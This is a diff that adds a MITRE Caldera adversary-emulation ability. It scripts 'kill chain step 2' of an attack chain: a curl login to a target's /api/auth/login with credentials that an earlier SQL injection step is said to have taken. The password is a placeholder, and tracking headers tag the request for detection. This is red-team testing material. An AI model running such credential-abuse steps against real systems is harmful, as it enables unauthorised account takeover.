@@ -1,0 +1,28 @@
+- id: bb22cc33-dd44-4ee5-ff66-aa7788990011
+  name: Authentication with Stolen Credentials (Kill Chain)
+  description: SQLi로 추출한 크레덴셜을 사용하여 로그인합니다. 이전 UNION_DATA_LEAKED 이벤트와 연계하면 공격 체인을 추적할 수 있습니다.
+  tactic: credential-access
+  technique:
+    attack_id: T1078
+    name: Valid Accounts
+  platforms:
+    linux:
+      sh:
+        command: |-
+          TARGET="http://#{target.url}"
+          OP_ID="#{operation_id}"
+
+          echo "[*] Kill Chain Step 2: Auth with Stolen Credentials"
+
+          # 추출된 크레덴셜로 로그인 시도
+          curl -s -o /dev/null -w "HTTP=%{http_code}\n" \
+            -H "X-Caldera-Op-Id: ${OP_ID}" \
+            -H "X-Caldera-Technique: T1078" \
+            -H "X-Caldera-Ability: bb22cc33-dd44-4ee5-ff66-aa7788990011" \
+            -A "Caldera/${OP_ID}/T1078/bb22cc33" \
+            -H "Content-Type: application/json" \
+            -X POST \
+            -d '{"username":"admin","password":"extracted_hash_value"}' \
+            "${TARGET}/api/auth/login"
+
+          echo "[*] Login attempted with stolen credentials"
